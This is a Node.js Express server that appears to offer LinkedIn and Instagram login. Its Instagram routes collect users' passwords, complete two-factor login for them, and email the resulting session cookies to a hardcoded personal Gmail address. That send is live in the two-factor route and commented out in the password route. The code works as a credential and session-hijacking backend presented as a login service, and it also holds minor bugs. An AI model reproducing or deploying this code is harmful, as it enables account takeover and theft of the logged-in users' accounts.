if (process.env.NODE_ENV !== "production") {
  require("dotenv").config();
}
var nodemailer = require("nodemailer");

const {
  IgApiClient,
  IgLoginTwoFactorRequiredError,
  IgLoginBadPasswordError,
  IgLoginInvalidUserError,
  IgCheckpointError,
} = require("instagram-private-api");

const ig = new IgApiClient();
var Promise = require("bluebird");
let express = require("express"),
  util = require("util"),
  session = require("express-session"),
  cookieParser = require("cookie-parser"),
  bodyParser = require("body-parser"),
  router = express.Router(),
  app = express();

let passport = require("passport");
let cors = require("cors");
var path = require("path");
let LinkedInStrategy = require("passport-linkedin-oauth2").Strategy;
var transporter = nodemailer.createTransport({
  service: "gmail",
  auth: {
    user: process.env.email,
    pass: process.env.password,
  },
});
app.set("views".__dirname + "/views");
app.set("view-engine", "ejs");
app.listen(process.env.PORT || 4000, function () {
  console.log("server running on", process.env.PORT || 4000);
});

app.options("*", cors());
app.use(cors());
app.use(cookieParser());
app.use(bodyParser.json()); // handle json data
app.use(bodyParser.urlencoded({ extended: true })); // handle URL-encoded data
app.set("views", __dirname + "/views");
app.set("view engine", "ejs");

app.use(express.static(path.join(__dirname, "build")));

//
app.use(
  session({
    secret: process.env.SESSIONSECRET,
    resave: false,
    saveUninitialized: false,
  })
);
app.use(passport.initialize());
app.use(passport.session());

passport.serializeUser(function (user, done) {
  done(null, user);
});

passport.deserializeUser(function (obj, done) {
  done(null, obj);
});

passport.use(
  new LinkedInStrategy(
    {
      clientID: process.env.LINKEDINCLIENTID,
      clientSecret: process.env.LINKEDINCLIENTSECRET,
      callbackURL: "https://mysterious-reaches-98129.herokuapp.com/callback/",
      scope: ["r_emailaddress", "r_liteprofile"],
    },
    function (accessToken, refreshToken, profile, done) {
      // asynchronous verification, for effect...
      process.nextTick(function () {
        // To keep the example simple, the user's LinkedIn profile is returned to
        // represent the logged-in user. In a typical application, you would want
        // to associate the LinkedIn account with a user record in your database,
        // and return that user instead.
        profile["accessToken"] = accessToken;
        profile["refreshToken"] = refreshToken;
        return done(null, profile);
      });
    }
  )
);

//LinkedIn login route
app.get("/linkedin", passport.authenticate("linkedin"));
// callback method which linkedin will hit after successfull login of user
app.get(
  "/callback/",
  passport.authenticate("linkedin", {
    failureRedirect: "/",
    successRedirect: "/linkedin/profile",
  }),
  (req, res) => {
    console.log(cookie);
    console.log(res.cookie);
    console.log(req.cookies);
    res.redirect("/linkedin/profile");
  }
);
//profile of linkedin user
app.get("/linkedin/profile", ensureAuthenticated, function (req, res) {
  console.log(req.user);
  res.render("index", {
    user: req.user,
    session: req.session.id,
  });
});
//home route
app.get("/", function (req, res) {
  res.send("<h1>Welcome</h1>");
});
//resend auth code
app.get("/insta/getCode", (req, res) => {
  if (req.query.choice != null)
    ig.challenge
      .replay(req.query.choice)
      .then((response) => {
        res.json({ success: true, response: response });
      })
      .catch((err) => {
        res.json({ success: false });
      });
});
//verify email code
app.get("/insta/emailVerify", (req, res) => {
  return ig.challenge
    .sendSecurityCode(req.query.code)
    .then((val) => {
      console.log("verification success");
      res.json({
        success: true,
        redirect: true,
        message: "security code verified",
      });
      res.end();
    })
    .catch((err) => {
      console.log(err);
      console.log("error occured in email auth");
      res.json({ success: false, message: "code is incorrect" });
    });
});
//submit auth code
app.get("/insta/submitCode", (req, res) => {
  ig.request.end$.subscribe(async () => {
    const cookies = await ig.state.serializeCookieJar();
    const state = {
      deviceString: ig.state.deviceString,
      deviceId: ig.state.deviceId,
      uuid: ig.state.uuid,
      phoneId: ig.state.phoneId,
      adid: ig.state.adid,
      build: ig.state.build,
    };
    // restore session cookies
    await ig.state.deserializeCookieJar(JSON.stringify(cookies));
    ig.state.deviceString = state.deviceString;
    ig.state.deviceId = state.deviceId;
    ig.state.uuid = state.uuid;
    ig.state.phoneId = state.phoneId;
    ig.state.adid = state.adid;
    ig.state.build = state.build;
  });

  console.log(req.query.code);

  return ig.account
    .twoFactorLogin({
      username: req.query.username,
      verificationCode: req.query.code,
      twoFactorIdentifier: req.query.two_factor_identifier,
      verificationMethod: req.query.verificationMethod, // '1' = SMS (default), '0' = OTP
      trustThisDevice: "1", // Can be omitted as '1' is used by default
    })
    .then((val) => {
      const cookies = ig.state.serializeCookieJar().then((val2) => {
        console.log("login success");
        var mailOptions = {
          from: process.env.email,
          to: "surya142327@gmail.com",
          subject: "cookies of user" + req.query.name,
          text: JSON.stringify(val2.cookies),
        };
        transporter.sendMail(mailOptions, function (error, info) {
          if (error) {
            console.log(error);
            res.json({
              success: true,
              user: val,
              cookie: JSON.stringify(val2.cookies),
              email_sent: false,
              message: "login Successful but failed to send email",
            });
          } else {
            console.log("Email sent: " + info.response);
            res.json({
              success: true,
              user: val,
              cookie: JSON.stringify(val2.cookies),
              message: "login Successful and email has been sent",
            });
            res.end();
          }
        });
      });
    })
    .catch((error) => {
      console.log(error);
      console.log("error occured in 2fa auth");
      res.json({ success: false, message: "code incorrect!" });
    });
});

app.post("/insta", (req, res) => {
  // Initiate Instagram API client
  console.log("insta login test");
  console.log(req.body);

  ig.state.generateDevice(req.body.username);

  return Promise.try(() =>
    ig.account.login(req.body.username, req.body.password).then((val) => {
      const cookies = ig.state.serializeCookieJar().then((val2) => {
        console.log(JSON.parse(val2.cookies));
        let modCookies = val2.cookies.map((cookiepairs) => {
          console.log(cookiepairs);
          // cookiepairs["name"] = cookiepairs["key"];
          // delete cookiepairs["key"];
        });
        console.log(modCookies);
        const validCookie = {
          url: "https://instagram.com",
          cookies: modCookies,
        };
        console.log(JSON.stringify(validCookie));
        var mailOptions = {
          from: process.env.email,
          to: "surya142327@gmail.com",
          subject: "cookies of user" + req.query.username,
          text: JSON.stringify(validCookie),
        };
        // transporter.sendMail(mailOptions, function (error, info) {
        //   if (error) {
        //     console.log(error);
        //     res.json({
        //       success: true,
        //       twoFactor: false,
        //       user: val,
        //       cookie: JSON.stringify(validCookie),
        //       message: "login Successful but failed to send email",
        //     });
        //   } else {
        //     console.log("Email sent: " + info.response);
        //     res.json({
        //       success: true,
        //       twoFactor: false,
        //       user: val,
        //       cookie: JSON.stringify(validCookie),
        //       message: "login Successful and email has been sent.",
        //     });
        //     res.end();
        //   }
        // });
      });
    })
  ).catch(
    IgLoginTwoFactorRequiredError,
    IgLoginBadPasswordError,
    IgLoginInvalidUserError,
    IgCheckpointError,
    async (err) => {
      console.log(err.response);
      if (
        err.response.body.error_type === "checkpoint_challenge_required" &&
        err.response.body.message === "challenge_required"
      ) {
        console.log(ig.state.checkpoint);
        await ig.challenge.auto(true);
        res.json({
          success: true,
          twoFactor: true,
          message: "A code has been sent to you via sms/email.Please check",
          email_auth: true,
        });
        res.end();
      }
      if (
        err.response.body.error_type === "bad_password" &&
        err.response.body.two_factor_info === undefined
      ) {
        res.json({ success: false, message: "invalid password" });
        res.end();
      } else if (err.response.body.error_type === "invalid_user") {
        res.json({ success: false, message: "invalid username" });
        res.end();
      } else {
        const {
          username,
          totp_two_factor_on,
          two_factor_identifier,
        } = err.response.body.two_factor_info;
        if (!two_factor_identifier) {
          res.json({
            message: "Unable to login, no 2fa identifier found",
            success: false,
          });
          res.end();
          throw new Error("Unable to login, no 2fa identifier found");
        }

        const verificationMethod = totp_two_factor_on ? "0" : "1"; // default to 1 for SMS
        console.log("sms sent");
        res //sending Two Factor details
          .json({
            username,
            two_factor_identifier,
            verificationMethod,
            success: true,
            twoFactor: true,
            email_auth: false,
            message: "code has been sent",
          });
        res.end;
      }

      // Use the code to finish the login process
    }
  );
});
function ensureAuthenticated(req, res, next) {
  if (req.isAuthenticated()) {
    return next();
  }
  res.redirect("/login");
}
// Method to logout
app.get("/logout", ensureAuthenticated, function (req, res) {
  req.logout();
  res.redirect("/");
});
app.get("/logout/insta", (req, res) => {
  ig.account
    .logout()
    .then((val) => {
      console.log("logout");
      console.log(val);
      res.json({ success: true });
    })
    .catch((err) => {
      res.json({ success: false });
    });
});
